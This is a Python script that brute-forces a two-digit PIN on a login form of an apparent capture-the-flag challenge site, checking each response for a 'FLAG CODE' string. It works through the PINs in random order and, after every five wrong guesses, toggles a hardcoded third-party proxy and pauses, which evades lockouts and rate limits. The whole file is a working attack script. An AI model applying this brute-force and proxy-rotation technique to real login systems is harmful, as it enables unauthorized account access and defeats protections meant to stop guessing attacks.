import requests
import time
import os
import sys
import random

if len(sys.argv) != 2:
    print('need a timeout value')
    exit(1)
time_out = int(sys.argv[1])

time_count = 0
def timer(time_count, new_time=0):
    if (new_time):
        time_count = new_time

    if (time_count <= 0):
        return
    else:
        print('time left: {}'.format(time_count), end='\r')
        time_count -= 1
        time.sleep(1)
        timer(time_count)

api_key = 'ENTER KEY HERE'
url = 'http://103.cybertrial.co.uk/login'

proxies = {'http': 'http://68.183.35.11:3128'} 

r = requests.session()
r.get(url + '?mykey=' + api_key)
proxy_active = False

incorrect_count = 0

pins = ["%.2d" % i for i in range(100)]
tried = []
for e in tried:
    pins.remove(tried)
for pin in range(100):
    # choose a random number from pins, then remove it from the list
    if (len(pins) == 1):
        print('pin found: {}'.format(pins[0]))
        for i in range(5):
            os.system('beep')
        exit(0)
    pin = random.choice(pins)
    pins.remove(pin)

    print('trying: {}'.format(pin))
    if proxy_active:
        resp = r.post(url, {'formgo':1, 'pin':pin,}, proxies=proxies)
    else:
        resp = r.post(url, {'formgo':1, 'pin':pin})
    
    if ('FLAG CODE' in resp.text):
        print('pin found: {}'.format(pin))
        for i in range(5):
            os.system('beep')
        exit(0)
    else:
        print('incorrect pin')
        
        incorrect_count += 1
        #f = open('tmp/{}'.format(pin), 'w')
        #f.write(resp.text)
        #f.close()
        #os.system('beep')

        if incorrect_count >= 5:
            incorrect_count = 0
            if not proxy_active:
                #print('activating proxy')
                proxy_active = True
            else:
                #print('stopping proxy')
                proxy_active = False
                #print('sleeping for 300 seconds')
                time_count = 0
                timer(time_count, time_out)
